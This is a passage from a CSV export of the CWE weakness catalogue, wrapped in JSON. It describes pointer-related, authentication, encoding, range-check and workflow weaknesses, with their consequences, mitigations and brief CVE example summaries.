memory used to access an individual array. Programs may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error. If an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the product. As a result, the attack might change the state of the product as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:125:VIEW ID:1000::NATURE:CanPrecede:CWE ID:787:VIEW ID:1000::,\"\",,\"\",\"::TERM:Untrusted pointer offset:DESCRIPTION:This term is narrower than the concept of out-of-range offset, since the offset might be the result of a calculation or other error that does not depend on any externally-supplied values.::\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:If the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is malformed or larger than expected by a read or write operation, the application may terminate unexpectedly.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:NOTE:If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2010-2160:DESCRIPTION:Invalid offset in undocumented opcode leads to memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2160::REFERENCE:CVE-2010-1281:DESCRIPTION:Multimedia player uses untrusted value from a file when using file-pointer calculations.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1281::REFERENCE:CVE-2009-3129:DESCRIPTION:Spreadsheet program processes a record with an invalid size field, which is later used as an offset.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3129::REFERENCE:CVE-2009-2694:DESCRIPTION:Instant messaging library does not validate an offset value specified in a packet.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2694::REFERENCE:CVE-2009-2687:DESCRIPTION:Language interpreter does not properly handle invalid offsets in JPEG image, leading to out-of-bounds memory access and crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2687::REFERENCE:CVE-2009-0690:DESCRIPTION:negative offset leads to out-of-bounds read:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0690::REFERENCE:CVE-2008-4114:DESCRIPTION:untrusted offset in kernel:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4114::REFERENCE:CVE-2010-2873:DESCRIPTION:blind trust of an offset value while writing heap memory allows corruption of function pointer,leading to code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2873::REFERENCE:CVE-2010-2866:DESCRIPTION:negative value (signed) causes pointer miscalculation:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2866::REFERENCE:CVE-2010-2872:DESCRIPTION:signed values cause incorrect pointer calculation:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2872::REFERENCE:CVE-2007-5657:DESCRIPTION:values used as pointer offsets:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5657::REFERENCE:CVE-2010-2867:DESCRIPTION:a return value from a function is sign-extended if the value is signed, then used as an offset for pointer arithmetic:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2867::REFERENCE:CVE-2009-1097:DESCRIPTION:portions of a GIF image used as offsets, causing corruption of an object pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1097::REFERENCE:CVE-2008-1807:DESCRIPTION:invalid numeric field leads to a free of arbitrary memory locations, then code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1807::REFERENCE:CVE-2007-2500:DESCRIPTION:large number of elements leads to a free of an arbitrary address:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2500::REFERENCE:CVE-2008-1686:DESCRIPTION:array index issue (CWE-129) with negative offset, used to dereference a function pointer:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1686::REFERENCE:CVE-2010-2878:DESCRIPTION:buffer seek value - basically an offset?:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2878::\",,,\"\",::129::,\"::TYPE:Maintenance:NOTE:There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains.::TYPE:Terminology:NOTE:Many weaknesses related to pointer dereferences fall under the general term of memory corruption or memory safety. As of September 2010, there is no commonly-used terminology that covers the lower-level variants.::\",\n824,\"Access of Uninitialized Pointer\",Base,Incomplete,\"The product accesses or uses a pointer that has not been initialized.\",\"If the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the product to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks. Depending on memory layout, associated memory management behaviors, and product operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:125:VIEW ID:1000::NATURE:CanPrecede:CWE ID:787:VIEW ID:1000::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:If the uninitialized pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:If the uninitialized pointer references a memory location that is not accessible to the product, or points to a location that is malformed (such as NULL) or larger than expected by a read or write operation, then a crash may occur.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:If the uninitialized pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2024-32878:DESCRIPTION:LLM product has a free of an uninitialized pointer:LINK:https://www.cve.org/CVERecord?id=CVE-2024-32878::REFERENCE:CVE-2010-0211:DESCRIPTION:chain: unchecked return value (CWE-252) leads to free of invalid, uninitialized pointer (CWE-824).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0211::REFERENCE:CVE-2009-2768:DESCRIPTION:Pointer in structure is not initialized, leading to NULL pointer dereference (CWE-476) and system crash.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2768::REFERENCE:CVE-2009-1721:DESCRIPTION:Free of an uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1721::REFERENCE:CVE-2009-1415:DESCRIPTION:Improper handling of invalid signatures leads to free of invalid pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1415::REFERENCE:CVE-2009-0846:DESCRIPTION:Invalid encoding triggers free of uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0846::REFERENCE:CVE-2009-0040:DESCRIPTION:Crafted PNG image leads to free of uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0040::REFERENCE:CVE-2008-2934:DESCRIPTION:Crafted GIF image leads to free of uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2934::REFERENCE:CVE-2007-4682:DESCRIPTION:Access of uninitialized pointer might lead to code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4682::REFERENCE:CVE-2007-4639:DESCRIPTION:Step-based manipulation: invocation of debugging function before the primary initialization function leads to access of an uninitialized pointer and code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4639::REFERENCE:CVE-2007-4000:DESCRIPTION:Unchecked return values can lead to a write to an uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4000::REFERENCE:CVE-2007-2442:DESCRIPTION:zero-length input leads to free of uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2442::REFERENCE:CVE-2007-1213:DESCRIPTION:Crafted font leads to uninitialized function pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1213::REFERENCE:CVE-2006-6143:DESCRIPTION:Uninitialized function pointer in freed memory is invoked:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6143::REFERENCE:CVE-2006-4175:DESCRIPTION:LDAP server mishandles malformed BER queries, leading to free of uninitialized memory:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4175::REFERENCE:CVE-2006-0054:DESCRIPTION:Firewall can crash with certain ICMP packets that trigger access of an uninitialized pointer.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-0054::REFERENCE:CVE-2003-1201:DESCRIPTION:LDAP server does not initialize members of structs, which leads to free of uninitialized pointer if an LDAP request fails.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1201::\",,,\"\",,\"::TYPE:Maintenance:NOTE:There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains.::TYPE:Terminology:NOTE:Many weaknesses related to pointer dereferences fall under the general term of memory corruption or memory safety. As of September 2010, there is no commonly-used terminology that covers the lower-level variants.::\",\n825,\"Expired Pointer Dereference\",Base,Incomplete,\"The product dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.\",\"When a product releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the product to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::NATURE:ChildOf:CWE ID:672:VIEW ID:1000::NATURE:CanPrecede:CWE ID:125:VIEW ID:1000::NATURE:CanPrecede:CWE ID:787:VIEW ID:1000::,\"\",,\"\",\"::TERM:Dangling pointer::\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:If the expired pointer is used in a read operation, an attacker might be able to control data read in by the application.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:If the expired pointer references a memory location that is not accessible to the product, or points to a location that is malformed (such as NULL) or larger than expected by a read or write operation, then a crash may occur.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:If the expired pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Choose a language that provides automatic memory management.::PHASE:Implementation:DESCRIPTION:When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.::\",\"::REFERENCE:CVE-2008-5013:DESCRIPTION:access of expired memory address leads to arbitrary code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5013::REFERENCE:CVE-2010-3257:DESCRIPTION:stale pointer issue leads to denial of service and possibly other consequences:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3257::REFERENCE:CVE-2008-0062:DESCRIPTION:Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0062::REFERENCE:CVE-2007-1211:DESCRIPTION:read of value at an offset into a structure after the offset is no longer valid:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1211::\",,,\"\",,\"::TYPE:Maintenance:NOTE:There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains.::TYPE:Terminology:NOTE:Many weaknesses related to pointer dereferences fall under the general term of memory corruption or memory safety. As of September 2010, there is no commonly-used terminology that covers the lower-level variants.::\",\n826,\"Premature Release of Resource During Expected Lifetime\",Base,Incomplete,\"The product releases a resource that is still intended to be used by itself or another actor.\",\"This weakness focuses on errors in which the product should not release a resource, but performs the release anyway. This is different than a weakness in which the product releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weakness, the resource should still be valid upon the subsequent access. When a product releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.\",::NATURE:ChildOf:CWE ID:666:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:672:VIEW ID:1000::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Read Memory:NOTE:If the released resource is subsequently reused or reallocated, then a read operation on the original resource might access sensitive data that is associated with a different user or entity.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:When the resource is released, the software might modify some of its structure, or close associated channels (such as a file descriptor). When the software later accesses the resource as if it is valid, the resource might not be in an expected state, leading to resultant errors that may lead to a crash.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Application Data:IMPACT:Modify Memory:NOTE:When the resource is released, the software might modify some of its structure. This might affect logic in the sections of code that still assume the resource is active. If the released resource is related to memory and is used in a function call, or points to unexpected data in a write operation, then code execution may be possible upon subsequent accesses.::\",\"\",\"\",\"::REFERENCE:CVE-2009-3547:DESCRIPTION:Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476):LINK:https://www.cve.org/CVERecord?id=CVE-2009-3547::\",,,\"\",,\"::TYPE:Research Gap:NOTE:Under-studied and under-reported as of September 2010. This weakness has been reported in high-visibility software, although the focus has been primarily on memory allocation and de-allocation. There are very few examples of this weakness that are not directly related to memory management, although such weaknesses are likely to occur in real-world software for other types of resources.::\","
  },
  "doc-88074170c40b068f2de0e6cdb92e9622": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n836,\"Use of Password Hash Instead of Password for Authentication\",Base,Incomplete,\"The product records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.\",\"Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password. As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:602:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker could bypass the authentication routine without knowing the original password.::\",\"\",\"\",\"::REFERENCE:CVE-2009-1283:DESCRIPTION:Product performs authentication with user-supplied password hashes that can be obtained from a separate SQL injection vulnerability (CVE-2009-1282).:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1283::REFERENCE:CVE-2005-3435:DESCRIPTION:Product allows attackers to bypass authentication by obtaining the password hash for another user and specifying the hash in the pwd argument.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3435::\",,,\"\",::644::652::,\"\",\n837,\"Improper Enforcement of a Single, Unique Action\",Base,Incomplete,\"The product requires that an actor should only be able to perform an action once, or to have only one unique action, but the product does not enforce or improperly enforces this restriction.\",\"In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to stuff the ballot box by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the product.\",::NATURE:ChildOf:CWE ID:799:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:NOTE:An attacker might be able to gain advantage over other users by performing the action multiple times, or affect the correctness of the product.::\",\"\",\"\",\"::REFERENCE:CVE-2008-0294:DESCRIPTION:Ticket-booking web application allows a user to lock a seat more than once.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0294::REFERENCE:CVE-2005-4051:DESCRIPTION:CMS allows people to rate downloads by voting more than once.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4051::REFERENCE:CVE-2002-216:DESCRIPTION:Polling software allows people to vote more than once by setting a cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-216::REFERENCE:CVE-2003-1433:DESCRIPTION:Chain: lack of validation of a challenge key in a game allows a player to register multiple times and lock other players out of the game.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1433::REFERENCE:CVE-2002-1018:DESCRIPTION:Library feature allows attackers to check out the same e-book multiple times, preventing other users from accessing copies of the e-book.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1018::REFERENCE:CVE-2009-2346:DESCRIPTION:Protocol implementation allows remote attackers to cause a denial of service (call-number exhaustion) by initiating many message exchanges.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2346::\",,,\"\",,\"\",\n838,\"Inappropriate Encoding for Output Context\",Base,Incomplete,\"The product uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.\",\"This weakness can cause the downstream component to use a decoding method that produces different data than what the product intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the product. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks. While using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output. For example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding. While web applications have received the most attention for this problem, this weakness could potentially apply to any type of product that uses a communications stream that could support multiple encodings.\",::NATURE:ChildOf:CWE ID:116:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:116:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component.::PHASE:Architecture and Design:STRATEGY:Output Encoding:DESCRIPTION:Where possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error. Note that some template mechanisms provide built-in support for the appropriate encoding.::\",\"::REFERENCE:CVE-2009-2814:DESCRIPTION:Server does not properly handle requests that do not contain UTF-8 data; browser assumes UTF-8, allowing XSS.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2814::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS13-J:ENTRY NAME:Use compatible encodings on both sides of file or network IO::\",::468::,\"\",\n839,\"Numeric Range Comparison Without Minimum Check\",Base,Incomplete,\"The product checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.\",\"Some products use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption. The use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.\",::NATURE:ChildOf:CWE ID:1023:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:195:VIEW ID:1000::NATURE:CanPrecede:CWE ID:682:VIEW ID:1000::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::NATURE:CanPrecede:CWE ID:124:VIEW ID:1000::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::,\"\",\"::TERM:Signed comparison:DESCRIPTION:The signed comparison term is often used to describe when the product uses a signed variable and checks it to ensure that it is less than a maximum value (typically a maximum buffer size), but does not verify that it is greater than 0.::\",\"\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands.::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:in some contexts, a negative value could lead to resource consumption.::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Read Memory:NOTE:If a negative value is used to access memory, buffers, or other indexable structures, it could access memory outside the bounds of the buffer.::\",\"\",\"::PHASE:Implementation:STRATEGY:Enforcement by Conversion:DESCRIPTION:If the number to be used is always expected to be positive, change the variable type from signed to unsigned or size_t.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:If the number to be used could have a negative value based on the specification (thus requiring a signed value), but the number should only be positive to preserve code correctness, then include a check to ensure that the value is positive.::\",\"::REFERENCE:CVE-2010-1866:DESCRIPTION:Chain: integer overflow (CWE-190) causes a negative signed value, which later bypasses a maximum-only check (CWE-839), leading to heap-based buffer overflow (CWE-122).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1866::REFERENCE:CVE-2009-1099:DESCRIPTION:Chain: 16-bit counter can be interpreted as a negative value, compared to a 32-bit maximum value, leading to buffer under-write.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1099::REFERENCE:CVE-2011-0521:DESCRIPTION:Chain: kernel's lack of a check for a negative value leads to memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0521::REFERENCE:CVE-2010-3704:DESCRIPTION:Chain: parser uses atoi() but does not check for a negative value, which can happen on some platforms, leading to buffer under-write.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3704::REFERENCE:CVE-2010-2530:DESCRIPTION:Chain: Negative value stored in an int bypasses a size check and causes allocation of large amounts of memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2530::REFERENCE:CVE-2009-3080:DESCRIPTION:Chain: negative offset value to IOCTL bypasses check for maximum index, then used as an array index for buffer under-read.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3080::REFERENCE:CVE-2008-6393:DESCRIPTION:chain: file transfer client performs signed comparison, leading to integer overflow and heap-based buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-6393::REFERENCE:CVE-2008-4558:DESCRIPTION:chain: negative ID in media player bypasses check for maximum index, then used as an array index for buffer under-read.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4558::\",,,\"\",,\"\",\n841,\"Improper Enforcement of Behavioral Workflow\",Base,Incomplete,\"The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.\",\"By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the product or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses. For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the product might still perform the transfer. Note that this is different than CWE-696, which focuses on when the product performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence. Workflow-related behaviors include: Steps are performed in the expected order. Required steps are not omitted. Steps are not interrupted. Steps are performed in a timely fashion.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Alter Execution Logic:NOTE:An attacker could cause the product to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications.::\",\"\",\"\",\"::REFERENCE:CVE-2011-0348:DESCRIPTION:Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0348::REFERENCE:CVE-2007-3012:DESCRIPTION:Attacker can access portions of a restricted page by canceling out of a dialog.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3012::REFERENCE:CVE-2009-5056:DESCRIPTION:Ticket-tracking system does not enforce a permission setting.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-5056::REFERENCE:CVE-2004-2164:DESCRIPTION:Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2164::REFERENCE:CVE-2003-0777:DESCRIPTION:Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0777::REFERENCE:CVE-2005-3327:DESCRIPTION:Chain: Authentication bypass by skipping the first startup step as required by the protocol.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3327::REFERENCE:CVE-2004-0829:DESCRIPTION:Chain: File server crashes when sent a find next request without an initial find first.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0829::REFERENCE:CVE-2010-2620:DESCRIPTION:FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2620::REFERENCE:CVE-2005-3296:DESCRIPTION:FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3296::\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:40:ENTRY NAME:Insufficient Process Validation::\",,\"::TYPE:Research Gap:NOTE:This weakness is typically associated with business logic flaws, except when it produces resultant weaknesses. The classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles. Many business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.::\",\n842,\"Placement of User into Incorrect Group\",Base,Incomplete,\"The product or the administrator places a user into an incorrect group.\",\"If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.\",::NATURE:ChildOf:CWE ID:286:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"\",\"::REFERENCE:CVE-1999-1193:DESCRIPTION:Operating system assigns user to privileged wheel group, allowing the user to gain root 